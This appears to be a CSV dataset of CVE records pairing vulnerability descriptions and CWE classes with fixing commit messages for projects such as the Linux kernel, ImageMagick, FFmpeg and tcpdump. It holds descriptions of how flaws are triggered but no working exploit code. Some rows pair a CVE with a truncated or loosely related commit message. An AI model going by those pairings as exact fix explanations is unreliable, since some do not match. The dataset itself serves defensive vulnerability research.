CVE-2019-5892,CWE-436,2019-01-10,"bgpd in FRRouting FRR (aka Free Range Routing) 2.x and 3.x before 3.0.4, 4.x before 4.0.1, 5.x before 5.0.2, and 6.x before 6.0.2 (not affecting Cumulus Linux or VyOS), when ENABLE_BGP_VNC is used for Virtual Network Control, allows remote attackers to cause a denial of service (peering session flap) via attribute 255 in a BGP UPDATE packet. This occurred during Disco in January 2019 because FRR does not implement RFC 7606, and therefore the packets with 255 were considered invalid VNC data and the BGP session was closed.",Signed-off-by: Lou Berger <lberger@labn.net>
CVE-2017-13142,CWE-754,2017-08-23,"In ImageMagick before 6.9.9-0 and 7.x before 7.0.6-1, a crafted PNG file could trigger a crash because there was an insufficient check for short files.",
CVE-2017-9527,CWE-416,2017-06-11,The mark_context_stack function in gc.c in mruby through 1.2.0 allows attackers to cause a denial of service (heap-based use-after-free and application crash) or possibly have unspecified other impact via a crafted .rb file.,
CVE-2018-10194,CWE-119,2018-04-18,"The set_text_distance function in devices/vector/gdevpdts.c in the pdfwrite component in Artifex Ghostscript through 9.22 does not prevent overflows in text-positioning calculation, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted PDF document.",
CVE-2016-8690,CWE-476,2017-02-15,The bmp_getdata function in libjasper/bmp/bmp_dec.c in JasPer before 1.900.5 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted BMP image in an imginfo command.,"Also, added a --debug-level command line option to the imginfo command for debugging purposes."
CVE-2015-4335,CWE-17,2015-06-09,Redis before 2.8.21 and 3.x before 3.0.2 allows remote attackers to execute arbitrary Lua bytecode via the eval command.,
CVE-2017-15127,CWE-460,2018-01-14,A flaw was found in the hugetlb_mcopy_atomic_pte function in mm/hugetlb.c in the Linux kernel before 4.13. A superfluous implicit page unlock for VM_SHARED hugetlbfs mapping could trigger a local denial of service (BUG).,
CVE-2017-12997,CWE-835,2017-09-14,The LLDP parser in tcpdump before 4.9.2 could enter an infinite loop due to a bug in print-lldp.c:lldp_private_8021_print().,"If you have a  	for (i = 0; i < N; i++)  loop, you'd better make sure that i is big enough to hold N - not N-1, N.  The TLV length here is 9 bits long, not 8 bits long, so an 8-bit loop counter will overflow and you can loop infinitely.  This fixes an infinite loop discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add tests using the capture files supplied by the reporter(s).  Clean up the output a bit while we're at it."
CVE-2016-4998,CWE-119,2016-07-03,The IPT_SO_SET_REPLACE setsockopt implementation in the netfilter subsystem in the Linux kernel before 4.6 allows local users to cause a denial of service (out-of-bounds read) or possibly obtain sensitive information from kernel heap memory by leveraging in-container root access to provide a crafted offset value that leads to crossing a ruleset blob boundary.,Otherwise this function may read data beyond the ruleset blob.  Signed-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
CVE-2014-1445,CWE-399,2014-01-18,"The wanxl_ioctl function in drivers/net/wan/wanxl.c in the Linux kernel before 3.11.7 does not properly initialize a certain data structure, which allows local users to obtain sensitive information from kernel memory via an ioctl call.",The wanxl_ioctl() code fails to initialize the two padding bytes of struct sync_serial_settings after the ->loopback member. Add an explicit memset(0) before filling the structure to avoid the info leak.  Signed-off-by: Salva Peiró <speiro@ai2.upv.es> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2017-12985,CWE-125,2017-09-14,The IPv6 parser in tcpdump before 4.9.2 has a buffer over-read in print-ip6.c:ip6_print().,"rt6_print(), ah_print(), and esp_print() return -1 if they run up against the end of the packet while dissecting; if that happens, stop dissecting, don't try to fetch the next header value, because 1) *it* might be past the end of the packet and 2) we won't be using it in any case, as we'll be exiting the loop.  Also, change mobility_print() to return -1 if it runs up against the end of the packet, and stop dissecting if it does so.  This fixes a buffer over-read discovered by Brian 'geeknik' Carpenter.  Add tests using the capture files supplied by the reporter(s)."
CVE-2011-1476,CWE-189,2012-06-21,Integer underflow in the Open Sound System (OSS) subsystem in the Linux kernel before 2.6.39 on unspecified non-x86 platforms allows local users to cause a denial of service (memory corruption) by leveraging write access to /dev/sequencer.,"Was: [PATCH] sound/oss/midi_synth: prevent underflow, use of uninitialized value, and signedness issue  The offset passed to midi_synth_load_patch() can be essentially arbitrary.  If it's greater than the header length, this will result in a copy_from_user(dst, src, negative_val).  While this will just return -EFAULT on x86, on other architectures this may cause memory corruption. Additionally, the length field of the sysex_info structure may not be initialized prior to its use.  Finally, a signed comparison may result in an unintentionally large loop.  On suggestion by Takashi Iwai, version two removes the offset argument from the load_patch callbacks entirely, which also resolves similar issues in opl3.  Compile tested only.  v3 adjusts comments and hopefully gets copy offsets right.  Signed-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2019-11412,CWE-670,2019-04-22,An issue was discovered in Artifex MuJS 1.0.5. jscompile.c can cause a denial of service (invalid stack-frame jump) because it lacks an ENDTRY opcode call.,In one of the code branches in handling exceptions in the catch block we forgot to call the ENDTRY opcode to pop the inner hidden try. This leads to an unbalanced exception stack which can cause a crash due to us jumping to a stack frame that has already been exited.
CVE-2016-9317,CWE-20,2017-01-26,The gdImageCreate function in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to cause a denial of service (system hang) via an oversized image.,gdImageCreate() doesn't check for oversized images and as such is prone to DoS vulnerabilities. We fix that by applying the same overflow check that is already in place for gdImageCreateTrueColor().  CVE-2016-9317
CVE-2017-11310,CWE-772,2017-07-13,The read_user_chunk_callback function in coders\png.c in ImageMagick 7.0.6-1 Q16 2017-06-21 (beta) has memory leak vulnerabilities via crafted PNG files.,#517).
CVE-2016-6271,CWE-254,2017-01-18,The Bzrtp library (aka libbzrtp) 1.0.x before 1.0.4 allows man-in-the-middle attackers to conduct spoofing attacks by leveraging a missing HVI check on DHPart2 packet reception.,
CVE-2013-7018,CWE-119,2013-12-09,"libavcodec/jpeg2000dec.c in FFmpeg before 2.1 does not ensure the use of valid code-block dimension values, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted JPEG2000 data.",Fixes out of array access Fixes Ticket2895  Found-by: Piotr Bandurski <ami_stuff@o2.pl> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2018-16644,CWE-119,2018-09-06,"There is a missing check for length in the functions ReadDCMImage of coders/dcm.c and ReadPICTImage of coders/pict.c in ImageMagick 7.0.8-11, which allows remote attackers to cause a denial of service via a crafted image.",
CVE-2014-3538,CWE-399,2014-07-03,"file before 5.19 does not properly restrict the amount of data read during a regex search, which allows remote attackers to cause a denial of service (CPU consumption) via a crafted file that triggers backtracking during processing of an awk rule.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-7345.","* Allow the l modifier for regex to mean line count. Default   to byte count. If line count is specified, assume a max   of 80 characters per line to limit the byte count. * Don't allow conversions to be used for dates, allowing   the mask field to be used as an offset. * Bump the version of the magic format so that regex changes   are visible."
CVE-2017-9059,CWE-404,2017-05-18,"The NFSv4 implementation in the Linux kernel through 4.11.1 allows local users to cause a denial of service (resource consumption) by leveraging improper channel callback shutdown when unmounting an NFSv4 filesystem, aka a ""module reference and kernel daemon"" leak.","Pull nfsd updates from Bruce Fields:  ""Another RDMA update from Chuck Lever, and a bunch of miscellaneous   bugfixes""  * tag 'nfsd-4.12' of git://linux-nfs.org/~bfields/linux: (26 commits)   nfsd: Fix up the ""supattr_exclcreat"" attributes   nfsd: encoders mustn't use unitialized values in error cases   nfsd: fix undefined behavior in nfsd4_layout_verify   lockd: fix lockd shutdown race   NFSv4: Fix callback server shutdown   SUNRPC: Refactor svc_set_num_threads()   NFSv4.x/callback: Create the callback service through svc_create_pooled   lockd: remove redundant check on block   svcrdma: Clean out old XDR encoders   svcrdma: Remove the req_map cache   svcrdma: Remove unused RDMA Write completion handler   svcrdma: Reduce size of sge array in struct svc_rdma_op_ctxt   svcrdma: Clean up RPC-over-RDMA backchannel reply processing   svcrdma: Report Write/Reply chunk overruns   svcrdma: Clean up RDMA_ERROR path   svcrdma: Use rdma_rw API in RPC reply path   svcrdma: Introduce local rdma_rw API helpers   svcrdma: Clean up svc_rdma_get_inv_rkey()   svcrdma: Add helper to save pages under I/O   svcrdma: Eliminate RPCRDMA_SQ_DEPTH_MULT   ..."
CVE-2014-1739,CWE-200,2014-06-23,"The media_device_enum_entities function in drivers/media/media-device.c in the Linux kernel before 3.14.6 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel memory by leveraging /dev/media0 read access for a MEDIA_IOC_ENUM_ENTITIES ioctl call.",This fixes CVE-2014-1739.  Signed-off-by: Salva Peiró <speiro@ai2.upv.es> Acked-by: Laurent Pinchart <laurent.pinchart@ideasonboard.com> Cc: stable@vger.kernel.org Signed-off-by: Mauro Carvalho Chehab <m.chehab@samsung.com>
CVE-2013-6763,CWE-119,2013-11-12,"The uio_mmap_physical function in drivers/uio/uio.c in the Linux kernel before 3.12 does not validate the size of a memory block, which allows local users to cause a denial of service (memory corruption) or possibly gain privileges via crafted mmap operations, a different vulnerability than CVE-2013-4511.","Nico Golde reports a few straggling uses of [io_]remap_pfn_range() that really should use the vm_iomap_memory() helper.  This trivially converts two of them to the helper, and comments about why the third one really needs to continue to use remap_pfn_range(), and adds the missing size check.  Reported-by: Nico Golde <nico@ngolde.de> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org."
CVE-2016-2106,CWE-189,2016-05-05,Integer overflow in the EVP_EncryptUpdate function in crypto/evp/evp_enc.c in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service (heap memory corruption) via a large amount of data.,
CVE-2019-13305,CWE-193,2019-07-05,ImageMagick 7.0.8-50 Q16 has a stack-based buffer overflow at coders/pnm.c in WritePNMImage because of a misplaced strncpy and an off-by-one error.,
CVE-2017-14054,CWE-834,2017-08-31,"In libavformat/rmdec.c in FFmpeg 3.3.3, a DoS in ivr_read_header() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted IVR file, which claims a large ""len"" field in the header but does not contain sufficient backing data, is provided, the first type==4 loop would consume huge CPU resources, since there is no EOF check inside the loop.",Fixes: loop.ivr  Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2018-19841,CWE-125,2018-12-04,"The function WavpackVerifySingleBlock in open_utils.c in libwavpack.a in WavPack through 5.1.0 allows attackers to cause a denial-of-service (out-of-bounds read and application crash) via a crafted WavPack Lossless Audio file, as demonstrated by wvunpack.",
CVE-2016-10129,CWE-476,2017-03-24,The Git Smart Protocol support in libgit2 before 0.24.6 and 0.25.x before 0.25.1 allows remote attackers to cause a denial of service (NULL pointer dereference) via an empty packet line.,"The Git protocol does not specify what should happen in the case of an empty packet line (that is a packet line ""0004""). We currently indicate success, but do not return a packet in the case where we hit an empty line. The smart protocol was not prepared to handle such packets in all cases, though, resulting in a `NULL` pointer dereference.  Fix the issue by returning an error instead. As such kind of packets is not even specified by upstream, this is the right thing to do."
CVE-2019-16718,CWE-78,2019-09-23,"In radare2 before 3.9.0, a command injection vulnerability exists in bin_symbols() in libr/core/cbin.c. By using a crafted executable file, it's possible to execute arbitrary shell commands with the permissions of the victim. This vulnerability is due to an insufficient fix for CVE-2019-14745 and improper handling of symbol names embedded in executables.","	> ""?e hello""""?e world"" 	hello 	world"" 	> ""?e hello"";""?e world"" 	hello 	world"
CVE-2012-3412,CWE-189,2012-10-03,The sfc (aka Solarflare Solarstorm) driver in the Linux kernel before 3.2.30 allows remote attackers to cause a denial of service (DMA descriptor consumption and network-controller outage) via crafted TCP packets that trigger a small MSS value.,"[ Upstream commit 7e6d06f ]  Currently an skb requiring TSO may not fit within a minimum-size TX queue.  The TX queue selected for the skb may stall and trigger the TX watchdog repeatedly (since the problem skb will be retried after the TX reset).  This issue is designated as CVE-2012-3412.  Set the maximum number of TSO segments for our devices to 100.  This should make no difference to behaviour unless the actual MSS is less than about 700.  Increase the minimum TX queue size accordingly to allow for 2 worst-case skbs, so that there will definitely be space to add an skb after we wake a queue.  To avoid invalidating existing configurations, change efx_ethtool_set_ringparam() to fix up values that are too small rather than returning -EINVAL.  Signed-off-by: Ben Hutchings <bhutchings@solarflare.com> Signed-off-by: David S. Miller <davem@davemloft.net> Signed-off-by: Ben Hutchings <ben@decadent.org.uk>"
CVE-2017-18222,CWE-119,2018-03-08,"In the Linux kernel before 4.12, Hisilicon Network Subsystem (HNS) does not consider the ETH_SS_PRIV_FLAGS case when retrieving sset_count data, which allows local users to cause a denial of service (buffer overflow and memory corruption) or possibly have unspecified other impact, as demonstrated by incompatibility between hns_get_sset_count and ethtool_get_strings.","hns_get_sset_count() returns HNS_NET_STATS_CNT and the data space allocated is not enough for ethtool_get_strings(), which will cause random memory corruption.  When SLAB and DEBUG_SLAB are both enabled, memory corruptions like the the following can be observed without this patch: [   43.115200] Slab corruption (Not tainted): Acpi-ParseExt start=ffff801fb0b69030, len=80 [   43.115206] Redzone: 0x9f911029d006462/0x5f78745f31657070. [   43.115208] Last user: [<5f7272655f746b70>](0x5f7272655f746b70) [   43.115214] 010: 70 70 65 31 5f 74 78 5f 70 6b 74 00 6b 6b 6b 6b  ppe1_tx_pkt.kkkk [   43.115217] 030: 70 70 65 31 5f 74 78 5f 70 6b 74 5f 6f 6b 00 6b  ppe1_tx_pkt_ok.k [   43.115218] Next obj: start=ffff801fb0b69098, len=80 [   43.115220] Redzone: 0x706d655f6f666966/0x9f911029d74e35b. [   43.115229] Last user: [<ffff0000084b11b0>](acpi_os_release_object+0x28/0x38) [   43.115231] 000: 74 79 00 6b 6b 6b 6b 6b 70 70 65 31 5f 74 78 5f  ty.kkkkkppe1_tx_ [   43.115232] 010: 70 6b 74 5f 65 72 72 5f 63 73 75 6d 5f 66 61 69  pkt_err_csum_fai  Signed-off-by: Timmy Li <lixiaoping3@huawei.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2011-4127,CWE-264,2012-07-03,"The Linux kernel before 3.2.2 does not properly restrict SG_IO ioctl calls, which allows local users to bypass intended restrictions on disk read and write operations by sending a SCSI command to (1) a partition block device or (2) an LVM volume.","Linux allows executing the SG_IO ioctl on a partition or LVM volume, and will pass the command to the underlying block device.  This is well-known, but it is also a large security problem when (via Unix permissions, ACLs, SELinux or a combination thereof) a program or user needs to be granted access only to part of the disk.  This patch lets partitions forward a small set of harmless ioctls; others are logged with printk so that we can see which ioctls are actually sent.  In my tests only CDROM_GET_CAPABILITY actually occurred. Of course it was being sent to a (partition on a) hard disk, so it would have failed with ENOTTY and the patch isn't changing anything in practice.  Still, I'm treating it specially to avoid spamming the logs.  In principle, this restriction should include programs running with CAP_SYS_RAWIO.  If for example I let a program access /dev/sda2 and /dev/sdb, it still should not be able to read/write outside the boundaries of /dev/sda2 independent of the capabilities.  However, for now programs with CAP_SYS_RAWIO will still be allowed to send the ioctls.  Their actions will still be logged.  This patch does not affect the non-libata IDE driver.  That driver however already tests for bd != bd->bd_contains before issuing some ioctl; it could be restricted further to forbid these ioctls even for programs running with CAP_SYS_ADMIN/CAP_SYS_RAWIO.  Cc: linux-scsi@vger.kernel.org Cc: Jens Axboe <axboe@kernel.dk> Cc: James Bottomley <JBottomley@parallels.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com> [ Make it also print the command name when warning - Linus ] Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-5873,CWE-119,2017-01-23,Buffer overflow in the HTTP URL parsing functions in pecl_http before 3.0.1 might allow remote attackers to execute arbitrary code via non-printable characters in a URL.,The parser's offset was not reset when we softfail in scheme parsing and continue to parse a path. Thanks to hlt99 at blinkenshell dot org for the report.
CVE-2017-9740,CWE-125,2017-07-26,The xps_decode_font_char_imp function in xps/xpsfont.c in Artifex Ghostscript GhostXPS 9.21 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) or possibly have unspecified other impact via a crafted document.,
CVE-2011-1575,CWE-399,2011-05-23,"The STARTTLS implementation in ftp_parser.c in Pure-FTPd before 1.0.30 does not properly restrict I/O buffering, which allows man-in-the-middle attackers to insert commands into encrypted FTP sessions by sending a cleartext command that is processed after TLS is in place, related to a ""plaintext command injection"" attack, a similar issue to CVE-2011-0411.",Fixes a flaw similar to CVE-2011-0411.
CVE-2019-15141,CWE-125,2019-08-18,"WriteTIFFImage in coders/tiff.c in ImageMagick 7.0.8-43 Q16 allows attackers to cause a denial-of-service (application crash resulting from a heap-based buffer over-read) via a crafted TIFF image file, related to TIFFRewriteDirectory, TIFFWriteDirectory, TIFFWriteDirectorySec, and TIFFWriteDirectoryTagColormap in tif_dirwrite.c of LibTIFF. NOTE: this occurs because of an incomplete fix for CVE-2019-11597.",
CVE-2015-3400,CWE-200,2017-10-18,"sharenfs 0.6.4, when built with commits bcdd594 and 7d08880 from the zfs repository, provides world readable access to the shared zfs file system, which might allow remote authenticated users to obtain sensitive information by reading shared files.",so that it can be (re)used in other parts of libshare.
CVE-2017-11719,CWE-125,2017-07-28,The dnxhd_decode_header function in libavcodec/dnxhddec.c in FFmpeg 3.0 through 3.3.2 allows remote attackers to cause a denial of service (out-of-array access) or possibly have unspecified other impact via a crafted DNxHD file.,"Fixes: out of array access Fixes: poc.dnxhd  Found-by: Bingchang, Liu@VARAS of IIE Signed-off-by: Michael Niedermayer <michael@niedermayer.cc> (cherry picked from commit 296debd) Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2014-8133,CWE-264,2014-12-17,"arch/x86/kernel/tls.c in the Thread Local Storage (TLS) implementation in the Linux kernel through 3.18.1 allows local users to bypass the espfix protection mechanism, and consequently makes it easier for local users to bypass the ASLR protection mechanism, via a crafted application that makes a set_thread_area system call and later reads a 16-bit value.","Installing a 16-bit RW data segment into the GDT defeats espfix. AFAICT this will not affect glibc, Wine, or dosemu at all.  Signed-off-by: Andy Lutomirski <luto@amacapital.net> Acked-by: H. Peter Anvin <hpa@zytor.com> Cc: stable@vger.kernel.org Cc: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: security@kernel.org <security@kernel.org> Cc: Willy Tarreau <w@1wt.eu> Signed-off-by: Ingo Molnar <mingo@kernel.org>"
CVE-2016-4565,CWE-264,2016-05-23,"The InfiniBand (aka IB) stack in the Linux kernel before 4.5.3 incorrectly relies on the write system call, which allows local users to cause a denial of service (kernel memory write operation) or possibly have unspecified other impact via a uAPI interface.","The drivers/infiniband stack uses write() as a replacement for bi-directional ioctl().  This is not safe. There are ways to trigger write calls that result in the return structure that is normally written to user space being shunted off to user specified kernel memory instead.  For the immediate repair, detect and deny suspicious accesses to the write API.  For long term, update the user space libraries and the kernel API to something that doesn't present the same security vulnerabilities (likely a structured ioctl() interface).  The impacted uAPI interfaces are generally only available if hardware from drivers/infiniband is installed in the system.  Reported-by: Jann Horn <jann@thejh.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com> [ Expanded check to all known write() entry points ] Cc: stable@vger.kernel.org Signed-off-by: Doug Ledford <dledford@redhat.com>"
CVE-2019-15903,CWE-125,2019-09-04,"In libexpat before 2.2.8, crafted XML input could fool the parser into changing from DTD parsing to document parsing too early; a consecutive call to XML_GetCurrentLineNumber (or XML_GetCurrentColumnNumber) then resulted in a heap-based buffer over-read.",
CVE-2016-6198,CWE-284,2016-08-06,"The filesystem layer in the Linux kernel before 4.5.5 proceeds with post-rename operations after an OverlayFS file is renamed to a self-hardlink, which allows local users to cause a denial of service (system crash) via a rename system call, related to fs/namei.c and fs/open.c.","If a file is renamed to a hardlink of itself POSIX specifies that rename(2) should do nothing and return success.  This condition is checked in vfs_rename().  However it won't detect hard links on overlayfs where these are given separate inodes on the overlayfs layer.  Overlayfs itself detects this condition and returns success without doing anything, but then vfs_rename() will proceed as if this was a successful rename (detach_mounts(), d_move()).  The correct thing to do is to detect this condition before even calling into overlayfs.  This patch does this by calling vfs_select_inode() to get the underlying inodes.  Signed-off-by: Miklos Szeredi <mszeredi@redhat.com> Cc: <stable@vger.kernel.org> # v4.2+"
CVE-2018-15862,CWE-476,2018-08-25,Unchecked NULL pointer usage in LookupModMask in xkbcomp/expr.c in xkbcommon before 0.8.2 could be used by local attackers to crash (NULL pointer dereference) the xkbcommon parser by supplying a crafted keymap file with invalid virtual modifiers.,testcase: 'virtualModifiers=LevelThreC'  Signed-off-by: Daniel Stone <daniels@collabora.com>
CVE-2018-16642,CWE-787,2018-09-06,The function InsertRow in coders/cut.c in ImageMagick 7.0.7-37 allows remote attackers to cause a denial of service via a crafted image file due to an out-of-bounds write.,
CVE-2017-16357,CWE-119,2017-11-01,"In radare 2.0.1, a memory corruption vulnerability exists in store_versioninfo_gnu_verdef() and store_versioninfo_gnu_verneed() in libr/bin/format/elf/elf.c, as demonstrated by an invalid free. This error is due to improper sh_size validation when allocating memory.",
CVE-2011-2482,CWE-476,2013-06-08,"A certain Red Hat patch to the sctp_sock_migrate function in net/sctp/socket.c in the Linux kernel before 2.6.21, as used in Red Hat Enterprise Linux (RHEL) 5, allows remote attackers to cause a denial of service (NULL pointer dereference and OOPS) via a crafted SCTP packet.","In current implementation, LKSCTP does receive buffer accounting for data in sctp_receive_queue and pd_lobby. However, LKSCTP don't do accounting for data in frag_list when data is fragmented. In addition, LKSCTP doesn't do accounting for data in reasm and lobby queue in structure sctp_ulpq. When there are date in these queue, assertion failed message is printed in inet_sock_destruct because sk_rmem_alloc of oldsk does not become 0 when socket is destroyed.  Signed-off-by: Tsutomu Fujii <t-fujii@nb.jp.nec.com> Signed-off-by: Vlad Yasevich <vladislav.yasevich@hp.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-10638,CWE-326,2019-07-05,"In the Linux kernel before 5.1.7, a device can be tracked by an attacker using the IP ID values the kernel produces for connection-less protocols (e.g., UDP and ICMP). When such traffic is sent to multiple destination IP addresses, it is possible to obtain hash collisions (of indices to the counter array) and thereby obtain the hashing key (via enumeration). An attack may be conducted by hosting a crafted web page that uses WebRTC or gQUIC to force UDP traffic to attacker-controlled IP addresses.","Commit 355b985 (""netns: provide pure entropy for net_hash_mix()"") makes net_hash_mix() return a true 32 bits of entropy.  When used in the IP ID generation algorithm, this has the effect of extending the IP ID generation key from 32 bits to 64 bits.  However, net_hash_mix() is only used for IP ID generation starting with kernel version 4.1.  Therefore, earlier kernels remain with 32-bit key no matter what the net_hash_mix() return value is.  This change addresses the issue by explicitly extending the key to 64 bits for kernels older than 4.1.  Signed-off-by: Amit Klein <aksecurity@gmail.com> Cc: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2016-4300,CWE-190,2016-09-21,"Integer overflow in the read_SubStreamsInfo function in archive_read_support_format_7zip.c in libarchive before 3.2.1 allows remote attackers to execute arbitrary code via a 7zip file with a large number of substreams, which triggers a heap-based buffer overflow.","If a 7-Zip archive declares a rediculously large number of substreams, it can overflow an internal counter, leading a subsequent memory allocation to be too small for the substream data.  Thanks to the Open Source and Threat Intelligence project at Cisco for reporting this issue."
CVE-2015-2304,CWE-22,2015-03-15,Absolute path traversal vulnerability in bsdcpio in libarchive 3.1.2 and earlier allows remote attackers to write to arbitrary files via a full pathname in an archive.,This fixes a directory traversal in the cpio tool.
CVE-2019-12973,CWE-834,2019-06-26,"In OpenJPEG 2.3.1, there is excessive iteration in the opj_t1_encode_cblks function of openjp2/t1.c. Remote attackers could leverage this vulnerability to cause a denial of service via a crafted bmp file. This issue is similar to CVE-2018-6616.","width/length dimensions read from bmp headers are not necessarily valid. For instance they may have been maliciously set to very large values with the intention to cause DoS (large memory allocation, stack overflow). In these cases we want to detect the invalid size as early as possible.  This commit introduces a counter which verifies that the number of written bytes corresponds to the advertized width/length.  Fixes #1059 (CVE-2018-6616)."
CVE-2016-2181,CWE-189,2016-09-16,"The Anti-Replay feature in the DTLS implementation in OpenSSL before 1.1.0 mishandles early use of a new epoch number in conjunction with a large sequence number, which allows remote attackers to cause a denial of service (false-positive packet drops) via spoofed DTLS records, related to rec_layer_d1.c and ssl3_record.c.",
CVE-2011-3102,CWE-189,2012-05-16,"Off-by-one error in libxml2, as used in Google Chrome before 19.0.1084.46 and other products, allows remote attackers to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via unknown vectors.",
CVE-2015-5289,CWE-119,2015-10-26,"Multiple stack-based buffer overflows in json parsing in PostgreSQL before 9.3.x before 9.3.10 and 9.4.x before 9.4.5 allow attackers to cause a denial of service (server crash) via unspecified vectors, which are not properly handled in (1) json or (2) jsonb values.",
CVE-2017-9501,CWE-617,2017-06-07,"In ImageMagick 7.0.5-7 Q16, an assertion failure was found in the function LockSemaphoreInfo, which allows attackers to cause a denial of service via a crafted file.",
CVE-2016-10128,CWE-119,2017-03-24,Buffer overflow in the git_pkt_parse_line function in transports/smart_pkt.c in the Git Smart Protocol support in libgit2 before 0.24.6 and 0.25.x before 0.25.1 allows remote attackers to have unspecified impact via a crafted non-flush packet.,"Each packet line in the Git protocol is prefixed by a four-byte length of how much data will follow, which we parse in `git_pkt_parse_line`. The transmitted length can either be equal to zero in case of a flush packet or has to be at least of length four, as it also includes the encoded length itself. Not checking this may result in a buffer overflow as we directly pass the length to functions which accept a `size_t` length as parameter.  Fix the issue by verifying that non-flush packets have at least a length of `PKT_LEN_SIZE`."
CVE-2018-15911,CWE-908,2018-08-28,"In Artifex Ghostscript 9.23 before 2018-08-24, attackers able to supply crafted PostScript could use uninitialized memory access in the aesdecode operator to crash the interpreter or potentially execute code.",
CVE-2017-14166,CWE-125,2017-09-06,"libarchive 3.3.2 allows remote attackers to cause a denial of service (xml_data heap-based buffer over-read and application crash) via a crafted xar archive, related to the mishandling of empty strings in the atol8 function in archive_read_support_format_xar.c.",
CVE-2017-9763,CWE-119,2017-06-19,"The grub_ext2_read_block function in fs/ext2.c in GNU GRUB before 2013-11-12, as used in shlr/grub/fs/ext2.c in radare2 1.5.0, allows remote attackers to cause a denial of service (excessive stack use and application crash) via a crafted binary file, related to use of a variable-size stack array.",
CVE-2018-10074,CWE-476,2018-04-12,The hi3660_stub_clk_probe function in drivers/clk/hisilicon/clk-hi3660-stub.c in the Linux kernel before 4.16 allows local users to cause a denial of service (NULL pointer dereference) by triggering a failure of resource retrieval.,"platform_get_resource() may return NULL, add proper check to avoid potential NULL dereferencing.  This is detected by Coccinelle semantic patch.  @@ expression pdev, res, n, t, e, e1, e2; @@  res = platform_get_resource(pdev, t, n); + if (!res) +   return -EINVAL; ... when != res == NULL e = devm_ioremap(e1, res->start, e2);  Fixes: 4f16f7f (""clk: hisilicon: Add support for Hi3660 stub clocks"") Signed-off-by: Wei Yongjun <weiyongjun1@huawei.com> Signed-off-by: Stephen Boyd <sboyd@kernel.org>"
CVE-2015-8816,,2016-04-27,"The hub_activate function in drivers/usb/core/hub.c in the Linux kernel before 4.3.5 does not properly maintain a hub-interface data structure, which allows physically proximate attackers to cause a denial of service (invalid memory access and system crash) or possibly have unspecified other impact by unplugging a USB hub device.","Commit 8520f38 (""USB: change hub initialization sleeps to delayed_work"") changed the hub_activate() routine to make part of it run in a workqueue.  However, the commit failed to take a reference to the usb_hub structure or to lock the hub interface while doing so.  As a result, if a hub is plugged in and quickly unplugged before the work routine can run, the routine will try to access memory that has been deallocated.  Or, if the hub is unplugged while the routine is running, the memory may be deallocated while it is in active use.  This patch fixes the problem by taking a reference to the usb_hub at the start of hub_activate() and releasing it at the end (when the work is finished), and by locking the hub interface while the work routine is running.  It also adds a check at the start of the routine to see if the hub has already been disconnected, in which nothing should be done.  Signed-off-by: Alan Stern <stern@rowland.harvard.edu> Reported-by: Alexandru Cornea <alexandru.cornea@intel.com> Tested-by: Alexandru Cornea <alexandru.cornea@intel.com> Fixes: 8520f38 (""USB: change hub initialization sleeps to delayed_work"") CC: <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2012-0879,CWE-400,2012-05-17,"The I/O implementation for block devices in the Linux kernel before 2.6.33 does not properly handle the CLONE_IO feature, which allows local users to cause a denial of service (I/O instability) by starting multiple processes that share an I/O context.","With CLONE_IO, parent's io_context->nr_tasks is incremented, but never decremented whenever copy_process() fails afterwards, which prevents exit_io_context() from calling IO schedulers exit functions.  Give a task_struct to exit_io_context(), and call exit_io_context() instead of put_io_context() in copy_process() cleanup path.  Signed-off-by: Louis Rilling <louis.rilling@kerlabs.com> Signed-off-by: Jens Axboe <jens.axboe@oracle.com>"
CVE-2013-0166,CWE-310,2013-02-08,"OpenSSL before 0.9.8y, 1.0.0 before 1.0.0k, and 1.0.1 before 1.0.1d does not properly perform signature verification for OCSP responses, which allows remote OCSP servers to cause a denial of service (NULL pointer dereference and application crash) via an invalid key.",
CVE-2017-12995,CWE-835,2017-09-14,The DNS parser in tcpdump before 4.9.2 could enter an infinite loop due to a bug in print-domain.c:ns_print().,"This is what BIND 9.11.0-P2 does; it not only detects pointers that loop, as ""point backwards"" means ""point before anything we've processed so far, including what we're processing right now"", so the pointer can't point to itself (as that's what we're processing right now).  This fixes an infinite loop discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add a test using the capture file supplied by the reporter(s).  Also, add some infinite-pointer-loop captures.  More checks should be done.  We might, for example, want to make sure the upper 2 bits of the label length/pointer byte are 00 or 11, and that if we encounter a pointer and jump backwards to what we think is a label the label ends before the beginning of the last label we processed, to make sure the pointer doesn't point backwards into the *middle* of a label, and also make sure the entire name is <= 255 bytes long."
